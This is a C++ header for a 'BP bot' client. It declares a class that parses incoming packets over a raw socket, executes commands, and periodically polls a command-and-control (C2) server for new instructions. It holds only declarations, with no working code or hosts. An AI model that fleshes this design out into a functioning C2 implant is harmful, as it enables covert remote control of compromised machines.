/*
 * BPHelper
 *
 * The main lib for the BP bot.
 * This contains all the logic on what the bot should do when a packet is recieved.
 * It also contains the function that periodically asks the C2 for another command.
 */


#ifndef BPHELPER_H
#define BPHELPER_H

#include <iostream>
#include <chrono>
#include <thread>
#include <functional>
#include <mutex>
#include <memory>
#include <vector>

#include "PacketCraft.hpp"
#include "Config.hpp"
#include "RawSocket.hpp"
#include "executeCommand.hpp"


class BPHelper {
private:
    RawSocket rawSocket;
#ifdef __unix__
    std::vector<uint8_t> nextHopMac;
#endif
    uint32_t currentCmd;

public:
    BPHelper();

    int actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo);

    void Receive();

    void requestAction();

    void requestActionLoop(int interval);

    void requestActionThread();
};

#endif
